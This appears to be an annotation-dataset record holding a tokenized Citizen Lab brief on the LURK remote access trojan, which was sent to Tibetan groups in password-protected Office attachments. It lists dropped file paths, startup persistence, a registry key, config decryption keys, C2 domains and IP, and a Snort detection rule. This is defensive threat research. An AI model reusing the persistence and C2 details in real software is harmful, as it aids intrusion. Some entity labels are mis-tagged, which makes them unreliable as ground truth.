113, "pos": []}, {"old_id": "T36", "type": "Email", "name": "jigme1@gmxcom", "sent_id": 113, "pos": []}, {"old_id": "T37", "type": "Email", "name": "agnes9@gmxcom", "sent_id": 113, "pos": []}, {"old_id": "T38", "type": "Address", "name": "2071781722", "sent_id": 115, "pos": []}, {"old_id": "T39", "type": "Email", "name": "August visit of South African group", "sent_id": 118, "pos": []}, {"old_id": "T40", "type": "Time", "name": "July 20", "sent_id": 119, "pos": [7, 8]}, {"old_id": "T41", "type": "Password", "name": "1959", "sent_id": 129, "pos": []}, {"old_id": "T42", "type": "File", "name": "Dharamsala August 2012 Full programxls", "sent_id": 130, "pos": []}, {"old_id": "T43", "type": "File", "name": "setxls", "sent_id": 133, "pos": []}, {"old_id": "T44", "type": "MD5", "name": "58f6922dedb0d43c4478a4f38ad08620", "sent_id": 141, "pos": [5]}, {"old_id": "T45", "type": "MD5", "name": "f2a0787388dd6373336b3f23f204524a", "sent_id": 142, "pos": [4]}, {"old_id": "T46", "type": "MD5", "name": "0fe550a5d1187d38984c505ef7741638", "sent_id": 143, "pos": [4]}, {"old_id": "T47", "type": "MD5", "name": "971f99af0f9df674a79507ed7b3010fb", "sent_id": 144, "pos": [8]}, {"old_id": "T48", "type": "TrojanHorse", "name": "%Temp%\\iexploreexe", "sent_id": 153, "pos": []}, {"old_id": "T49", "type": "MD5", "name": "16160a6a9b905c69cb8e92c319212980", "sent_id": 157, "pos": [0]}, {"old_id": "T50", "type": "MD5", "name": "1c22ee3326affee30c3fa65f0b8413d5", "sent_id": 158, "pos": [4]}, {"old_id": "T51", "type": "File", "name": "%AppData%\\Application Data\\Help\\CREATELINKEXE", "sent_id": 160, "pos": []}, {"old_id": "T52", "type": "File", "name": "%AppData%\\Help\\IconCacheEtDAT", "sent_id": 161, "pos": []}, {"old_id": "T53", "type": "File", "name": "%AppData%\\Help\\IconConfigEtDAT", "sent_id": 162, "pos": []}, {"old_id": "T54", "type": "File", "name": "%AppData\\\\Help\\iexploreexe", "sent_id": 163, "pos": []}, {"old_id": "T55", "type": "Indicator", "name": "C:\\Documents and Settings\\user\\Start Menu\\Programs\\Startup\\iexplorelnk", "sent_id": 171, "pos": []}, {"old_id": "T56", "type": "Indicator", "name": "0x11B297A9", "sent_id": 180, "pos": [18]}, {"old_id": "T57", "type": "Campaign", "name": "TIBET", "sent_id": 206, "pos": [6]}, {"old_id": "T58", "type": "Campaign", "name": "T706", "sent_id": 207, "pos": [5]}, {"old_id": "T59", "type": "Campaign", "name": "T801", "sent_id": 208, "pos": [5]}, {"old_id": "T60", "type": "TrojanHorse", "name": "Troj~Agent-XAT", "sent_id": 216, "pos": [5]}, {"old_id": "T61", "type": "TrojanHorse", "name": "TROJ_MDROPTPB", "sent_id": 216, "pos": []}, {"old_id": "T62", "type": "TrojanHorse", "name": "TROJ_MDROPTPC", "sent_id": 216, "pos": []}, {"old_id": "T63", "type": "Software", "name": "Generic PWS", "sent_id": 217, "pos": [15, 16]}, {"old_id": "T64", "type": "Campaign", "name": "IE_0day", "sent_id": 220, "pos": []}, {"old_id": "T65", "type": "Indicator", "name": "DbxUpdateET", "sent_id": 222, "pos": []}, {"old_id": "T66", "type": "Indicator", "name": "IconCacheEt", "sent_id": 223, "pos": []}, {"old_id": "T67", "type": "Indicator", "name": "IconConfigEt", "sent_id": 223, "pos": []}, {"old_id": "T68", "type": "Address", "name": "18410564183", "sent_id": 247, "pos": []}], "labels": [{"old_id": "R1", "r": "P21", "h": 7, "t": 3, "evidence": []}, {"old_id": "R2", "r": "P21", "h": 5, "t": 3, "evidence": []}, {"old_id": "R3", "r": "P21", "h": 6, "t": 3, "evidence": []}, {"old_id": "R4", "r": "P13", "h": 10, "t": 11, "evidence": [41, 42]}, {"old_id": "R5", "r": "P9", "h": 21, "t": 26, "evidence": [70, 71, 72, 73, 74, 75, 76, 77]}, {"old_id": "R6", "r": "P9", "h": 17, "t": 19, "evidence": [59, 60, 61, 62, 63, 64, 65, 66]}, {"old_id": "R7", "r": "P9", "h": 27, "t": 29, "evidence": [79, 80, 81, 82, 83, 84]}, {"old_id": "R8", "r": "P9", "h": 38, "t": 41, "evidence": [118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130]}], "title": ["inputs/txt/201207CitizenLabLURK"], "sents": [["The", "Citizen", "Lab"], ["Research", "Brief"], ["Number", "10", "\u2013", "July", "2012"], ["Recent", "Observations", "in", "Tibet-Related", "Information", "Operations:"], ["Advanced", "Social", "Engineering", "for", "the", "Distribution", "of", "LURK", "Malware"], ["KEY", "FINDINGS"], ["\uf0b7"], ["Social", "engineering", "techniques", "observed", "in", "recent", "targeted", "malware", "attacks", "against", "Tibetan"], ["organizations", "appear", "to", "repurpose", "authentic", ",", "privately-held", ",", "sensitive", "content", "of", "Tibetan", "groups", "\u2014", "in"], ["contrast", "to", "typical", "malware", "attacks", "that", "rely", "on", "simpler", "social", "engineering", "methods", ",", "such", "as", "referencing"], ["themes", "of", "interest", "to", "the", "organization", "or", "copying", "publicly", "available", "legitimate", "content", ".", "The", "use", "of", "this"], ["unique", "content", "suggests", "that", "attackers", "may", "have", "achieved", "a", "preliminary", "level", "of", "infiltration", "into"], ["Tibetan", "organizations", ",", "which", "could", "allow", "them", "to", "increase", "the", "apparent", "authenticity", "of", "subsequent"], ["attacks", "."], ["\uf0b7"], ["These", "recent", "malware", "attacks", "have", "incorporated", "a", "\u201cpasswording\u201d", "technique", ",", "whereby", "attached", ","], ["infected", "Microsoft", "Office", "files", "are", "encrypted", "and", "can", "only", "be", "opened", "with", "a", "password", "provided", "in", "the"], ["email", "body", "."], ["\uf0b7"], ["The", "payload", "of", "each", "of", "these", "targeted", "malware", "attacks", "is", "the", "LURK", "malware", ",", "a", "remote", "access", "trojan"], ["that", "is", "a", "variant", "of", "Gh0stRAT", "."], ["\uf0b7"], ["Once", "active", ",", "the", "malware", "delivered", "through", "each", "of", "these", "targeted", "attacks", "connects", "to", "the", "same"], ["command-and-control", "server:", "dtl", ".", "dnsd.me:63", "(184", ".", "105.64.183),", "which", "if", "inaccessible", "uses", "a", "backup"], ["domain", ",", "dtl", ".", "eatuo.com:63.", "Both", "dnsd", ".", "me", "and", "eatuo", ".", "com", "are", "dynamic", "DNS", "providers", ",", "and", "eatuo", ".", "com"], ["has", "the", "same", "domain", "registration", "information", "as", "the", "well-known", "Chinese", "provider", "3322", ".", "net."], ["1"], ["Number", "10", "\u2013", "July", "2012"], ["BACKGROUND"], ["This", "blog", "post", "is", "the", "third", "in", "a", "series", "documenting", "the", "use", "of", "information", "operations", "against", "Tibetans", "and"], ["others", "who", "advocate", "for", "Tibetan", "rights", "and", "freedoms", "."], ["Previous", "research", "by", "the", "Citizen", "Lab", "has", "described", "information", "operations", "that", "leveraged", "the", "issue", "of", "selfimmolations", "amongst", "Tibetans", ",", "as", "well", "as", "a", "recent", "European", "Parliament", "resolution", "on", "the", "human", "rights"], ["situation", "in", "Tibet", "."], ["OVERVIEW"], ["In", "its", "ongoing", "study", "of", "targeted", "cyber", "threats", "against", "civil", "society", "organizations", ",", "Citizen", "Lab", "has", "analyzed", "11"], ["malicious", "emails", "sent", "to", "Tibetan", "organizations", "between", "May", "and", "July", "2012", "that", "display", "noteworthy", "common"], ["elements", ",", "including", "malware", "that", "connects", "to", "the", "same", "command-and-control", "server", "."], ["Attackers", "have", "targeted", "at", "least", "three", "separate", "organizations", ",", "sending", "the", "malicious", "emails", "to", "seven", "different"], ["email", "addresses", "associated", "with", "those", "three", "organizations", "."], ["In", "each", "of", "these", "emails", ",", "the", "malicious", "file", "is", "password-protected", ",", "such", "that", "it", "can", "only", "be", "opened", "with", "a"], ["password", "provided", "in", "the", "email", "text", "(or", "in", "one", "case", ",", "in", "an", "image", "attached", "to", "the", "email)", ",", "and", "the", "payload", "\u2014"], ["LURK", "malware", "\u2014", "is", "the", "same", "."], ["The", "level", "of", "authenticity", "of", "the", "social", "engineering", "used", "in", "these", "emails", ",", "however", ",", "has", "increased", "over", "time", ",", "with"], ["the", "most", "recent", "emails", "repurposing", "sensitive", "content", "of", "Tibetan", "groups", "that", "was", "most", "likely", "privately", "held"], ["and/or", "inaccessible", "to", "the", "general", "public", "."], ["The", "use", "of", "such", "content", "suggests", "that", "attackers", "may", "have", "achieved", "a", "preliminary", "level", "of", "infiltration", "into"], ["Tibetan", "organizations", ",", "which", "could", "allow", "them", "to", "accomplish", "more", "advanced", "and", "effective", "social", "engineering", ","], ["thereby", "increasing", "the", "risk", "of", "compromise", "."], ["TARGETED", "MALWARE", "ATTACKS"], ["In", "the", "11", "emails", "there", "are", "four", "distinct", "messages", "used", "in", "the", "attacks", ",", "as", "outlined", "and", "illustrated", "below", ".", "The"], ["malicious", "attachments", "are", "all", "Microsoft", "Office", "documents", "\u2014", "two", "Word", "documents", "and", "two", "Excel", "files", "\u2014", "that"], ["are", "encrypted", "using", "four-digit", "numeric", "passwords", ",", "perhaps", "in", "an", "attempt", "to", "prevent", "detection", "of", "the", "malicious"], ["file", "by", "antivirus", "software", ",", "or", "to", "increase", "the", "apparent", "authenticity", "of", "the", "document", "."], ["The", "passwords", "appear", "to", "have", "been", "chosen", "to", "reflect", "dates", "of", "historical", "significance", "with", "respect", "to", "Tibet", "\u2014"], ["for", "example", ",", "1959", "was", "the", "year", "of", "the", "Tibetan", "uprising", "against", "the", "rule", "of", "the", "Communist", "Party", "of", "China", ","], ["which", "is", "commemorated", "by", "the", "Tibetan", "community", "every", "year", "on", "March", "10", ".", "The", "malicious", "payloads", "all"], ["communicate", "with", "the", "same", "command-and-control", "(C2)", "server", "(discussed", "further", "below)", "."], ["2"], ["Number", "10", "\u2013", "July", "2012"], ["1", ".", "\u201cDroeshi\u201d"], ["The", "first", "email", ",", "which", "was", "only", "sent", "to", "one", "email", "address", "of", "which", "we", "are", "aware", ",", "was", "sent", "on", "May", "24", ","], ["2012", "from", "what", "appears", "to", "be", "a", "compromised", "yahoo", ".", "com", "email", "account", "associated", "with", "a", "Tibetan"], ["activist", ",", "from", "the", "IP", "address", "209", ".", "234.204.31", "(likely", "a", "compromised", "server):"], ["3"], ["Number", "10", "\u2013", "July", "2012"], ["Note", "that", "the", "salutation", "does", "not", "include", "the", "name", "of", "the", "recipient", ",", "nor", "is", "it", "signed", ".", "The", "password"], ["required", "to", "open", "the", "attachment", "is", "4155", ".", "1", "The", "attachment", "is", "a", "Word", "document", "named", "Droeshi", "final", ".", "doc"], ["\u2014", "when", "opened", "and", "supplied", "with", "the", "password", ",", "it", "crashes", "Word", "and", "drops", "its", "malicious", "payload"], ["(described", "in", "more", "detail", "below)", ".", "No", "clean", "file", "is", "dropped", "or", "shown", "to", "the", "user", ",", "and", "there", "is", "no", "author"], ["or", "summary", "metadata", "."], ["2", ".", "\u201cStatement", "of", "the", "Kashag\u201d"], ["The", "second", "email", "was", "sent", "on", "July", "5", "to", "at", "least", "two", "different", "organizations", ".", "The", "body", "of", "these", "emails"], ["contains", "only", "\u201cPASSWORD:", "0706", ".", "\u201d2", "The", "subject", "is", "\u201cTHE", "STATEMENT", "OF", "THE", "KASHAG", "ON"], ["THE", "SEVENTY-SEVENTH", "BIRTHDAY", "CELEBRATION", "OF", "HIS", "HOLINESS", "THE", "DALAI"], ["LAMA\u201d", "and", "the", "\u201cFrom\u201d", "address", "spoofs", "the", "real", "address", "of", "a", "Tibetan", "organization", ".", "Although", "the", "emails"], ["are", "identical", "and", "were", "sent", "from", "the", "same", "IP", "address", "(65", ".", "166.97.211),", "the", "actual", "email", "addresses", "used"], ["to", "send", "each", "message", "differ:", "eabliz@gmx", ".", "com", "and", "hientr@gmx", ".", "com."], ["This", "email", "also", "attached", "a", "single", "Word", "document", ",", "July6thFinal", ".", "doc,", "that", "exhibits", "similar", "behaviour", "to"], ["the", "Droeshi", "document", "but", "drops", "a", "slightly", "different", "malicious", "executable", "."], ["3", ".", "\u201cThe", "concept", "notes\u201d"], ["The", "third", "email", "came", "in", "two", "versions", "on", "July", "17", ",", "differing", "only", "in", "an", "additional", "blank", "line", "in", "the", "email"], ["body", "and", "a", "typo", "in", "the", "subject", "line", "of", "one", "version", ".", "The", "social", "engineering", "has", "been", "significantly"], ["stepped", "up", "in", "this", "attack", ",", "though", "there", "are", "still", "numerous", "tell-tale", "signs", "that", "it", "is", "not", "legitimate", ".", "This"], ["email", "had", "five", "attachments:", "four", "benign", "", ".", "docx", "files", ",", "as", "well", "as", "a", "malicious", "Excel", "file", "named"], ["EIDHR_action_plan", ".", "xlsx."], ["4"], ["Number", "10", "\u2013", "July", "2012"], ["Again", "there", "is", "no", "name", "in", "the", "salutation", ",", "but", "the", "email", "is", "signed", "in", "this", "case", ".", "The", "signature", "and", "\u201cFrom\u201d"], ["address", "used", "spoof", "a", "representative", "of", "the", "Office", "of", "Tibet", "."], ["The", "Word", "documents", "attached", "to", "this", "email", "contain", "what", "appears", "to", "be", "an", "actual", "application", "by", "a"], ["Tibetan", "organization", "to", "the", "European", "Instrument", "for", "Democracy", "and", "Human", "Rights", "(EIDHR)", "."], ["The", "timing", "of", "this", "attack", "is", "particularly", "noteworthy", "in", "that", "a", "genuine", "EIDHR", "call", "for", "proposals", "\u2014"], ["including", "for", "\u201cActions", "Aimed", "at", "Fighting", "Cyber-Censorship", "and", "to", "Promote", "Internet", "Access", "and"], ["Secure", "Digital", "Communication\u201d", "\u2014", "was", "pending", "at", "the", "time", ",", "with", "a", "July", "20", "deadline", "for", "concept", "notes", "."], ["Such", "documentation", "related", "to", "grant", "proposals", "is", "typically", "of", "a", "sensitive", "and", "internal", "nature", "to", "civil"], ["society", "organizations", ",", "and", "inclusion", "of", "such", "content", "in", "a", "targeted", "malware", "attack", "is", "concerning", ",", "as", "it"], ["suggests", "access", "to", "confidential", "materials", "and", "perhaps", "even", "awareness", "of", "the", "parameters", "of", "the", "EIDHR"], ["call", "."], ["Only", "the", "attached", "malicious", "Excel", "file", "requires", "the", "password", "\u2014", "19333", "\u2014", "to", "open", ",", "whereas", "the"], ["attached", "Word", "documents", "are", "not", "password", "protected", ".", "The", "malicious", "Excel", "file", "is", "actually", "an", "OLE", "file", ","], ["not", "the", "newer", "Office", "Open", "XML", "format", "that", "the", "", ".", "xlsx", "extension", "suggests", ",", "and", "Excel", "refuses", "to", "open", "it"], ["unless", "the", "extension", "is", "changed", "to", "", ".", "xls.", "The", "dropped", "malicious", "executable", "is", "identical", "to", "the", "one", "from"], ["the", "\u201cStatement", "of", "the", "Kashag\u201d", "email", "."], ["This", "file", "also", "drops", "a", "clean", "document", ",", "\u201cset", ".", "xls,\u201d", "in", "the", "user\u2019s", "temporary", "folder", "and", "opens", "it", "in", "Excel", "."], ["The", "contents", "of", "the", "file", "were", "unreadable", "on", "all", "computers", "we", "tried", "it", "on", ",", "displaying", "only", "question"], ["marks", ".", "However", ",", "the", "metadata", "of", "the", "file", "shows", "the", "author", "as", "\u2018walkinnet\u2019", "."], ["5"], ["Number", "10", "\u2013", "July", "2012"], ["We", "saw", "five", "instances", "of", "this", "message", ",", "going", "to", "three", "different", "organizations", ".", "The", "email", "with", "the", "typo"], ["in", "the", "subject", "(\u201cTthe", "concept", "notes\u201c)", "went", "to", "two", "different", "organizations", ",", "from", "a", "different", "IP"], ["(66", ".", "103.141.237)", "than", "the", "\u201cStatement", "of", "the", "Kashag\u201d", "email", ".", "Different", "gmx", ".", "com", "addresses", "were", "used", "to"], ["send", "each", "message:", "c100tibet_board@gmx", ".", "com", "and", "ijoni_futbollisti@gmx", ".", "com."], ["The", "other", "three", "instances", "of", "this", "email", "had", "the", "subject", "\u201cThe", "concept", "notes\u201d", "and", "were", "sent", "by", "yet", "more"], ["unique", "gmx", ".", "com", "addresses:", "abarbour@gmx", ".", "com,", "jigme1@gmx", ".", "com", "and", "agnes9@gmx", ".", "com.", "The", "first"], ["two", "were", "sent", "from", "the", "same", "IP", "as", "used", "for", "the", "\u201cStatement", "of", "the", "Kashag", ",", "\u201d", "but", "the", "third", "came", "from"], ["207", ".", "178.172.2."], ["6"], ["Number", "10", "\u2013", "July", "2012"], ["4", ".", "\u201cAugust", "visit", "of", "South", "African", "group\u201d"], ["The", "most", "recent", "email", "was", "sent", "on", "July", "20", "to", "at", "least", "two", "organizations", ",", "one", "of", "which", "received", "it", "at", "two"], ["different", "addresses", ".", "The", "email", "contains", "text", "and", "an", "Excel", "attachment", "that", ",", "as", "with", "the", "\u201cThe", "concept"], ["notes\u201d", "email", ",", "suggest", "the", "attacker", "had", "access", "to", "confidential", "communications", "of", "a", "Tibetan"], ["organization", "."], ["The", "spoofed", "\u201cFrom\u201d", "address", ",", "subject", "(\u201cAugust", "visit", "of", "South", "African", "group\u201d)", ",", "and", "text", "of", "the", "email", "all"], ["appear", "to", "be", "repurposed", "from", "an", "authentic", "message", "sent", "to", "a", "Tibetan", "organization", "from", "a", "person"], ["seeking", "advice", "regarding", "an", "upcoming", "trip", "to", "Dharamsala", ",", "and", "the", "content", "includes", "in-depth", "details", "on"], ["trip", "logistics", "and", "planning", "."], ["In", "this", "case", ",", "the", "password", "required", "to", "open", "the", "attached", "Excel", "file", "is", "not", "in", "the", "body", "of", "the", "email", ",", "but"], ["added", "(rather", "awkwardly)", "to", "an", "attached", "image", "of", "the", "logo", "of", "the", "organization", "belonging", "to", "the", "spoofed"], ["sender", ".", "The", "password", "is", "\u201c1959", ",", "\u201d", "the", "year", "of", "the", "aforementioned", "Tibetan", "uprising", "."], ["The", "attached", "Excel", "file", ",", "Dharamsala", "August", "2012", "Full", "program", ".", "xls,", "is", "similar", "to", "the", "malicious"], ["attachment", "in", "\u201cThe", "concept", "notes\u201d", "email", ",", "but", "it", "drops", "a", "different", "clean", "file", ".", "In", "this", "case", "the", "file", "is"], ["readable", "and", "contains", "what", "is", "almost", "certainly", "an", "authentic", "itinerary", ",", "which", "is", "referenced", "in", "the", "email", "."], ["The", "clean", "file", "is", "also", "called", "set", ".", "xls,", "defaults", "to", "the", "same", "Chinese", "font", ",", "and", "has", "the", "same", "\u2018walkinnet\u2019"], ["author", "metadata", "as", "the", "clean", "document", "in", "\u201cThe", "concept", "notes", ".", "\u201d"], ["TECHNICAL", "ANALYSIS"], ["Delivery", "Methods"], ["Within", "the", "dataset", "examined", "by", "Citizen", "Lab", ",", "two", "Word", "documents", "and", "two", "Excel", "documents", "were", "sent"], ["embedded", "with", "LURK", "malware", ",", "a", "remote", "access", "trojan", "that", "is", "a", "variant", "of", "Gh0stRAT", ".", "Note", "that", "the", "XLSX", "file"], ["is", "actually", "a", "standard", "", ".", "XLS", "file", ",", "not", "the", "new", "XML", "format", "."], ["The", "MD5", "hashes", "of", "the", "documents", "are", "as", "follows:"], ["Droeshi", "final", ".", "doc", "\u2013", "58f6922dedb0d43c4478a4f38ad08620"], ["July6thFinal", ".", "doc", "\u2013", "f2a0787388dd6373336b3f23f204524a"], ["EIDHR_action_plan", ".", "xlsx", "\u2013", "0fe550a5d1187d38984c505ef7741638"], ["Dharamsala", "August", "2012", "Full", "program", ".", "xls", "\u2013", "971f99af0f9df674a79507ed7b3010fb"], ["7"], ["Number", "10", "\u2013", "July", "2012"], ["Each", "document", "is", "encrypted", "with", "a", "four-digit", "numeric", "password", ",", "a", "tactic", "seen", "previously", "in", "other", "emails", ".", "This"], ["tactic", "makes", "it", "more", "difficult", "to", "identify", "embedded", "payloads", "and", "the", "vulnerability", "used", "."], ["All", "of", "the", "files", "except", "for", "the", "first", "(Droeshi", "final", ".", "doc)", "have", "the", "same", "malware", "files", "embedded", ".", "The", "first", "uses", "a"], ["variant", "of", "the", "LURK", "trojan", "that", "is", "very", "similar", ",", "but", "not", "identical", ",", "to", "the", "others", "."], ["Infection"], ["In", "each", "of", "the", "four", "cases", ",", "the", "document", "exploit", "drops", "the", "LURK", "trojan:"], ["%Temp%\\iexplore", ".", "exe"], ["Two", "different", "versions", "of", "the", "trojan", "were", "seen", "between", "the", "four", "cases", ".", "While", "they", "all", "use", "the", "same", "filenames", ","], ["in", "one", "case", ",", "the", "MD5", "of", "the", "trojan", "is", "different:"], ["July6thFinal", ".", "doc,", "EIDHR_action_plan", ".", "xlsx,", "Dharamsala", "August", "2012", "Full", "program", ".", "xls:"], ["16160a6a9b905c69cb8e92c319212980"], ["Droeshi", "final", ".", "doc:", "1c22ee3326affee30c3fa65f0b8413d5"], ["LURK", "also", "uses", "the", "following", "files:"], ["%AppData%\\Application", "Data\\Help\\CREATELINK", ".", "EXE"], ["%AppData%\\Help\\IconCacheEt", ".", "DAT"], ["%AppData%\\Help\\IconConfigEt", ".", "DAT"], ["%AppData\\\\Help\\iexplore", ".", "exe"], ["Additionally", ",", "the", "samples", "that", "use", "Excel", "as", "their", "vector", "also", "drop", "a", "clean", "file", ",", "opened", "after", "the", "malware"], ["executes:"], ["8"], ["Number", "10", "\u2013", "July", "2012"], ["%Temp%\\set", ".", "xls"], ["For", "persistence", ",", "the", "trojan", "also", "creates", "the", "following", "link", "in", "the", "Startup", "folder", ",", "pointing", "at", "the", "iexplore", ".", "exe"], ["binary", "in", "%AppData%:"], ["C:\\Documents", "and", "Settings\\user\\Start", "Menu\\Programs\\Startup\\iexplore", ".", "lnk"], ["The", "binary", "in", "%AppData%", "is", "only", "9KB", "and", "acts", "as", "a", "launcher", "."], ["IconConfigEt", ".", "DAT", "is", "the", "trojan\u2019s", "configuration", "file", ",", "storing", "the", "C2", "server", "addresses", "and", "ports", ",", "as", "well", "as", "a"], ["campaign", "name", "identifier", ".", "The", "file", "is", "mostly", "encrypted", ",", "with", "the", "campaign", "name", "stored", "in", "the", "clear", ".", "The"], ["configuration", "options", "are", "read", "from", "the", "main", "executable", "using", "GetPrivateProfileStringW()", ",", "a", "function", "for", "preregistry", "configuration", "storage", ".", "This", "function", "is", "for", "backwards", "compatibility", "with", "pre-registry", "16-bit", "Windows"], ["applications", ",", "and", "is", "not", "commonly", "used", "in", "modern", "applications", "."], ["9"], ["Number", "10", "\u2013", "July", "2012"], ["Decryption", "of", "the", "configuration", "file", "is", "done", "in", "sub_4044B0()", "using", "a", "key", "generated", "in", "sub_404430()", "\u2014", "the"], ["default", "is", "0x11B29719", ",", "in", "the", "case", "of", "the", "more", "common", "version", "of", "the", "trojan", "the", "key", "is", "0x11B297A9", ".", "Once"], ["the", "values", "have", "been", "read", "from", "the", "decrypted", "file", ",", "it", "is", "re-encrypted", "in", "sub_404560()", "."], ["Encrypted", "on", "disk", "(default):"], ["Decrypted:"], ["Once", "the", "configuration", "file", "is", "decrypted", ",", "the", "values", "are", "still", "not", "readable", ".", "Fortunately", ",", "the", "second", "layer"], ["decryption", "is", "an", "easy", "process", "\u2014", "just", "decrement", "each", "character", "by", "1", "."], ["The", "values", "read", "from", "the", "configuration", "file", "are:"], ["1", ".", "Section", "[PPP]", ",", "key", "P:", "Primary", "C2", "server", "port", "number"], ["2", ".", "Section", "[WWW]", ",", "key", "W:", "Primary", "C2", "server", "name"], ["3", ".", "Section", "[PPP1]", ",", "key", "P1:", "Secondary", "C2", "server", "port", "number"], ["4", ".", "Section", "[WWW1]", ",", "key", "W1:", "Secondary", "C2", "server", "name"], ["5", ".", "Section", "[PPP2]", ",", "key", "P2:", "Tertiary", "C2", "server", "port", "number"], ["6", ".", "Section", "[WWW2]", ",", "key", "W2:", "Tertiary", "C2", "server", "name"], ["7", ".", "Section", "[MMM]", ",", "key", "M:", "Campaign", "name"], ["10"], ["Number", "10", "\u2013", "July", "2012"], ["In", "the", "configuration", "files", "we", "have", "looked", "at", "for", "this", "run", ",", "the", "primary", "server", "is", "dtl", ".", "dnsd.me:63,", "and", "the"], ["secondary", "server", "is", "dtl", ".", "eatuo.com:63.", "Both", "dnsd", ".", "me", "and", "eatuo", ".", "com", "are", "dynamic", "DNS", "providers", ",", "and"], ["eatuo", ".", "com", "has", "the", "same", "domain", "registration", "information", "as", "the", "well-known", "Chinese", "provider", "3322", ".", "org.", "No"], ["tertiary", "server", "is", "given", "."], ["The", "malware", "checks", "in", "sub_4040E0()", "for", "a", "value", "of", "\u201cMark\u201d", "in", "the", "registry", "at", "the", "following", "location:"], ["HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\DbxUpdateET\\"], ["If", "a", "value", "is", "not", "found", ",", "it", "is", "set", "with", "the", "campaign", "name", "read", "from", "the", "configuration", "file", "key", "M", "."], ["Campaign", "Names"], ["The", "four", "samples", "we", "received", "use", "three", "different", "campaign", "names", ",", "identified", "as", "follows", "in", "value", "7", "of", "each"], ["configuration", "file:"], ["Droeshi", "final", ".", "doc:", "campaign", "id", "TIBET"], ["July6thFinal", ".", "doc:", "campaign", "id", "T706", "(note", "that", "the", "password", "on", "the", "file", "is", "also", "0706", ",", "keeping", "on", "theme)"], ["EIDHR_action_plan", ".", "xlsx:", "campaign", "id", "T801"], ["Dharamsala", "August", "2012", "Full", "program", ".", "xls:", "campaign", "id", "T801"], ["The", "campaign", "names", "strongly", "suggest", "that", "these", "runs", "are", "specific", "to", "the", "Tibetan", "community", ",", "and", "that", "the", "Txxx"], ["attacks", "may", "be", "coming", "from", "the", "same", "source", ".", "The", "July6thFinal", ".", "doc,", "EIDHR_action_plan", ".", "xlsx,", "and"], ["Dharamsala", "August", "2012", "Full", "program", ".", "xls", "documents", "all", "drop", "the", "same", "trojan;", "the", "Droeshi", "final", ".", "doc", "trojan", "is"], ["slightly", "different", "(although", "uses", "much", "of", "the", "same", "code)", "."], ["Malware", "Analysis"], ["These", "samples", "match", "the", "behavior", "seen", "with", "other", "recorded", "instances", "of", "samples", "from", "this", "family", "in", "the", "wild", "."], ["LURK", "is", "also", "known", "as", "Troj~Agent-XAT", "(Sophos)", ",", "TROJ_MDROP", ".", "TPB", "and", "TROJ_MDROP", ".", "TPC", "(Trend"], ["Micro)", ",", "and", "can", "also", "be", "picked", "up", "by", "more", "general", "antivirus", "detection", "such", "as", "Generic", "PWS", ".", "y", "(McAfee)", ".", "In"], ["11"], ["Number", "10", "\u2013", "July", "2012"], ["the", "sample", "analyzed", "by", "Sophos", ",", "the", "campaign", "ID", "is", "\u201cIE_0day\u201d", "\u2014", "not", "immediately", "related", "to", "attacks", "on", "the"], ["Tibetan", "community", "."], ["Many", "more", "samples", "within", "this", "family", "exist", "with", "reports", "online", "\u2014", "look", "for", "\u201cDbxUpdateET\u201d", "(where", "the"], ["campaign", "ID", "is", "stored", "in", "the", "registry)", "or", "the", "dropped", "files", "\u201cIconCacheEt\u201d", "and", "\u201cIconConfigEt", ".", "\u201d", "Another"], ["Tibetan-themed", "example", "using", "the", "dtl", ".", "eatuo.com", "domain", "was", "reported", "by", "ZenLab", "on", "March", "26", ",", "2012", "."], ["The", "LURK", "malware", "is", "also", "referenced", "with", "a", "description", "of", "the", "communication", "protocol", "in", "Command", "Five\u2019s"], ["paper", "\u201cCommand", "and", "Control", "in", "the", "Fifth", "Domain", ".", "\u201d", "The", "network", "behavior", "we", "observed", "matches", "the", "described"], ["protocol", "."], ["An", "additional", "file", "with", "the", "T801", "campaign", "ID", "that", "we", "observed", "used", "twice", "was", "uploaded", "to", "ThreatExpert", "and"], ["can", "be", "found", "here", "."], ["Command", "and", "Control", "Information"], ["A", "port", "scan", "of", "the", "C2", "server", "shows", "the", "following", "ports", "are", "open:"], ["PORT", "STATE", "SERVICE", "VERSION"], ["21/tcp", "open", "tcpwrapped"], ["53/tcp", "open", "domain", "?"], ["80/tcp", "closed", "http"], ["81/tcp", "open", "hosts2-ns", "?"], ["135/tcp", "open", "msrpc", "Microsoft", "Windows", "RPC"], ["1026/tcp", "open", "msrpc", "Microsoft", "Windows", "RPC"], ["8080/tcp", "open", "http-proxy", "?"], ["In", "addition", "to", "port", "63", "(which", "is", "not", "shown", "as", "open", "in", "the", "above", "scan)", ",", "ports", "81", "and", "53", "are", "both", "LURK", "."], ["Network", "Traffic"], ["In", "addition", "to", "the", "dropped", "files", ",", "infected", "machines", "can", "be", "found", "on", "a", "network", "by", "looking", "for", "the", "following"], ["indications", "of", "compromise:"], ["\uf0b7"], ["DNS", "lookup", "of", "the", "C2", "domains:", "dtl", ".", "dnsd.me,", "dtl", ".", "eatuo.com"], ["\uf0b7"], ["Traffic", "to", "the", "C2", "IP:", "184", ".", "105.64.183", "\u2014", "this", "includes", "traffic", "over", "port", "53", ",", "which", "is", "normally", "DNS"], ["12"], ["Number", "10", "\u2013", "July", "2012"], ["\uf0b7"], ["TCP", "traffic", "over", "port", "53", "that", "begins", "with", "\u201cLURK0\u201d"], ["The", "beginning", "of", "a", "network", "connection", "to", "the", "C2", "server", "looks", "like", "this:"], ["If", "the", "C2", "is", "not", "actively", "responding", ",", "not", "much", "data", "will", "be", "transmitted", "beyond", "TCP:"], ["For", "detection", ",", "Jaime", "Blasco", "from", "AlienVault", "has", "written", "a", "Snort", "rule", "that", "will", "detect", "LURK", "traffic", "(originally"], ["found", "here):"], ["13"], ["Number", "10", "\u2013", "July", "2012"], ["alert", "tcp", "$HOME_NET", "any", "->", "$EXTERNAL_NET", "$HTTP_PORTS", "(msg:\u201dAPT", "LURK", "communication"], ["protocol", "detected\u201d;", "flow:established", ",", "to_server;", "content:\u201d|4C", "55", "52", "4B", "30|\u201d;", "depth:5;"], ["reference:url,www", ".", "commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf;"], ["classtype:trojan-activity;", "sid:3000006;", "rev:1;)"], ["RECOMMENDATIONS"], ["\uf0b7"], ["Civil", "society", "organizations", ",", "particularly", "those", "working", "on", "issues", "related", "to", "Tibetan", "rights", ",", "should"], ["exercise", "caution", "with", "respect", "to", "any", "email", "containing", "a", "link", "or", "attachment", ".", "As", "the", "targeted", "malware"], ["attacks", "analyzed", "in", "this", "report", "demonstrate", ",", "content", "used", "to", "induce", 